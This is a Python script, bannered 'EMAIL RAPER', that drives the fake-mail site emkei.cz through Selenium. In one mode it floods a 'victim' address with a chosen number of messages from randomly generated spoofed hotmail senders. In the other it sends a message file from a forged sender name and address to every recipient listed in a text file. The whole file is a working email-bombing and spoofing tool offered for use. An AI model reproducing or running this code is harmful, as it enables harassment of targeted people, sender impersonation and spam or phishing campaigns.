from selenium import webdriver
from colorama import Fore, Back, Style
from selenium.common.exceptions import *
from selenium.webdriver.chrome.options import Options
from essential_generators import DocumentGenerator

import random
gen = DocumentGenerator()
while True:
    print(Fore.GREEN +''' 
        ╔═══════════════╗╔═══════════════╗╔═══════════════╗╔═══════════════╗╔═══════════════╗
        ███████╗███╗░░░███╗░█████╗░██╗██╗░░░░░  ██████╗░░█████╗░██████╗░███████╗██████╗░
        ██╔════╝████╗░████║██╔══██╗██║██║░░░░░  ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
        █████╗░░██╔████╔██║███████║██║██║░░░░░  ██████╔╝███████║██████╔╝█████╗░░██████╔╝
        ██╔══╝░░██║╚██╔╝██║██╔══██║██║██║░░░░░  ██╔══██╗██╔══██║██╔═══╝░██╔══╝░░██╔══██╗
        ███████╗██║░╚═╝░██║██║░░██║██║███████╗  ██║░░██║██║░░██║██║░░░░░███████╗██║░░██║
        ╚══════╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝  ╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚══════╝╚═╝░░╚═╝
        ╚═══════════════╝╚═══════════════╝╚═══════════════╝╚═══════════════╝╚═══════════════╝''', )

    type = input(Fore.BLACK+' [1] SINGLE EMAIL \n [2] MULTIPLE EMAILS \n [3] QUIT \n')


    if type == '1':
        try:
            many = input('ENTER VICTIM EMAIL: ')
            numbers = input('HOW MANY EMAILS: ')
            if '@' in many:
                print('RUNNING.....')
                options = Options()
                options.headless = True

                web = webdriver.Chrome()
                numbers1 = 0
                for x in range(int(numbers)):
                        emailss = gen.word()
                        #print(emailss)
                        addition = random.randint(00000,99999)
                        email = emailss+str(addition)+'@hotmail.com'


                        numbers1 += 1
                        web.get('https://emkei.cz/')
                        web.find_element_by_xpath('//*[@id="fromname"]').send_keys('Marcus')
                        web.find_element_by_xpath('//*[@id="from"]').send_keys(email)
                        web.find_element_by_xpath('//*[@id="rcpt"]').send_keys(many)
                        web.find_element_by_xpath('//*[@id="subject"]').send_keys('Park Meeting')
                        web.find_element_by_xpath('//*[@id="text"]').send_keys('Send me the park invite!')
                        web.find_element_by_xpath('//*[@id="sendfrm"]/table[3]/tbody/tr[4]/td[2]/input[2]').click()
                        print(Fore.GREEN+'SENT '+str(numbers1)+'/'+numbers+' to '+many)

            else:
                print('ERROR   -----NO @ IN EMAIL----')
                pass
        except:
            print("ERROR PLEASE TRY AGAIN SOMETHING WENT WRONG")

    elif type == '3':
            print("BYE BYE")
            break


    elif type == '2':
        try:
            list = 'emails.txt'
            message = input('ENTER THE FILE NAME WITH THE MESSAGE YOUR WANT TO SEND:  ')
            f= open(message,'r')
            text = f.read()
            fromemail = input('FROM EMAIL: ')
            fromname = input('FROM NAME: ')
            subject = input('SUBJECT: ')

            print('RUNNING....')
            file1 = open(list, "r")
            web = webdriver.Chrome()


            for line in file1:
                liney=(line.strip())
                web.get('https://emkei.cz/')
                web.find_element_by_xpath('//*[@id="fromname"]').send_keys(fromname)
                web.find_element_by_xpath('//*[@id="from"]').send_keys(fromemail)
                web.find_element_by_xpath('//*[@id="rcpt"]').send_keys(liney)
                web.find_element_by_xpath('//*[@id="subject"]').send_keys(subject)
                web.find_element_by_xpath('//*[@id="text"]').send_keys(text)
                web.find_element_by_xpath('//*[@id="sendfrm"]/table[3]/tbody/tr[4]/td[2]/input[2]').click()
                print(Fore.GREEN+'SENT ONE EMAIL TO '+liney)

            # close file
            file1.close
            web.quit()
        except:
                print("ERROR PLEASE TRY AGAIN SOMETHING WENT WRONG")



            



